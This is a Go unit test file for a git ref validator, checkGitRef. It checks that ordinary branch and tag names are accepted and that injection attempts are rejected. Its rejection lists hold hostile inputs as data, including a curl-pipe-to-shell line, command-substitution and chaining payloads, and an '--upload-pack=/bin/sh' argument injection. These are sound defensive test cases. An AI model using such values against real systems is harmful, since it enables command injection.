/*
 * Copyright Octelium Labs, LLC. All rights reserved.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package wsutils

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestCheckGitRef(t *testing.T) {

	t.Run("valid", func(t *testing.T) {
		for _, ref := range []string{
			"",
			"main",
			"master",
			"v1.2.3",
			"release/2026-01",
			"feature/JIRA-123_thing",
			"users/bob/wip",
			"9a1f0c4e2b7d8f6a3c5e1b9d7f2a4c6e8b0d2f4a",
			"HEAD",
			"1.0.0+build.7",
		} {
			assert.Nil(t, checkGitRef("branch", ref), "ref should be valid: %q", ref)
		}
	})

	t.Run("shell metacharacters are rejected", func(t *testing.T) {
		for _, ref := range []string{
			"main; curl http://x | sh",
			"main && id",
			"main`id`",
			"main$(id)",
			"main\nid",
			"main id",
			"main|id",
			"main>out",
			"main'x'",
			`main"x"`,
			"main&",
		} {
			assert.NotNil(t, checkGitRef("branch", ref), "ref should be rejected: %q", ref)
		}
	})

	t.Run("leading dash is rejected", func(t *testing.T) {
		for _, ref := range []string{
			"-main",
			"--upload-pack=/bin/sh",
			"-o",
		} {
			assert.NotNil(t, checkGitRef("checkout", ref), "ref should be rejected: %q", ref)
		}
	})

	t.Run("ref-name rules", func(t *testing.T) {
		for _, ref := range []string{
			"a..b",
			"..",
			"main.lock",
			"refs/heads/",
		} {
			assert.NotNil(t, checkGitRef("branch", ref), "ref should be rejected: %q", ref)
		}
	})

	t.Run("length is bounded", func(t *testing.T) {
		long := make([]byte, 300)
		for i := range long {
			long[i] = 'a'
		}
		assert.NotNil(t, checkGitRef("branch", string(long)))
	})
}
